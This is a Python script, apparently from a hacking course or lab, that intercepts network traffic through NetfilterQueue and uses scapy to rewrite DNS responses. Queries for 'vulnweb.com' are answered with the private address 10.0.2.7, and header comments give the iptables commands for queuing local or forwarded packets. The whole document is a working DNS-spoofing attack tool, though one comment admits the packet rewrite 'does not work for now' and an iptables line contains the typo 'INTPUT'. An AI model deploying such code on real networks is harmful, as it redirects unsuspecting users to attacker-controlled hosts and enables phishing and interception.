#!/usr/bin/env python

# if testing this program locally please use:
# > sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
# > sudo iptables -I INTPUT -j NFQUEUE --queue-num 0"
# if on a remote computer:
# > sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
# you can use:
# > iptables --flush
# when done

from netfilterqueue import NetfilterQueue

from scapy.all import *

from scapy.layers.inet import *
from scapy.layers.inet6 import *
from scapy.layers.dns import *
from scapy.sendrecv import *
from scapy.supersocket import *
from scapy.layers.l2 import *
from scapy.layers.dot11 import *
from scapy.utils import *
from scapy.config import *


def process_packet(nfq_packet):
    scapy_packet = IP(nfq_packet.get_payload())
    if scapy_packet.haslayer(DNSRR):  # looking for DNS Response, DNSRQ for DNS request
        qname = scapy_packet[DNSQR].qname
        if "vulnweb.com" in str(qname):
            print("[+] Spoofing target")
            answer = DNSRR(rrname=qname, rdata="10.0.2.7")
            scapy_packet[DNS].an = answer
            scapy_packet[DNS].ancount = 1
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[UDP].len
            del scapy_packet[UDP].chksum
            nfq_packet.set_payload(bytes(scapy_packet))#  does not work for now
    nfq_packet.accept()  # packet.drop() if you do not want to forward the packet ;)


queue = NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
